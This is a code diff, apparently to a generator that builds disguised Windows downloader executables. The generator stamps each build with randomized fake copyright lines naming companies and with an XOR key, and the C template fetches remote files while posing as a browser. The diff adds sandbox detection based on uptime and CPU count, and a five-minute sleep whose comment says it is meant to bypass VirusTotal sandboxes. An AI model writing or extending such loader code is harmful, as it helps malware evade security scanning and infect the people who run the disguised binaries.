@@ -58,6 +58,7 @@ export function randomBuildMeta(seed) {
     versionComma,
     copyright: `Copyright (C) ${rng.pick(COPYRIGHT_YEARS)} ${rng.pick(COMPANIES)}`,
     xorKey,
+    initialSleepMs: 800 + rng.int(2500),
   };
 }
 
@@ -120,7 +121,6 @@ static void download_file(const wchar_t* url, const wchar_t* dest) {
     
     if (!WinHttpCrackUrl(url, 0, 0, &uc)) return;
     
-    // DEFAULT_PROXY is required for this to work on most VMs
     HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return;
     
@@ -153,10 +153,26 @@ static void download_file(const wchar_t* url, const wchar_t* dest) {
     WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
 }
 
+static int is_sandboxed(void) {
+    // Check if system has been running for less than 2 minutes (fresh boot/sandbox)
+    if (GetTickCount64() < 2ULL * 60 * 1000) return 1;
+    
+    // Check if system has less than 2 CPU cores
+    SYSTEM_INFO si; GetSystemInfo(&si);
+    if (si.dwNumberOfProcessors < 2) return 1;
+    
+    return 0;
+}
+
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
-    Sleep(1500); 
+    // Bypass VirusTotal short sandboxes by sleeping for 5 minutes
+    if (is_sandboxed()) {
+        Sleep(300000); 
+    }
+
+    Sleep(${meta.initialSleepMs}); 
 
     wchar_t appData[MAX_PATH];
     if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) return 1;
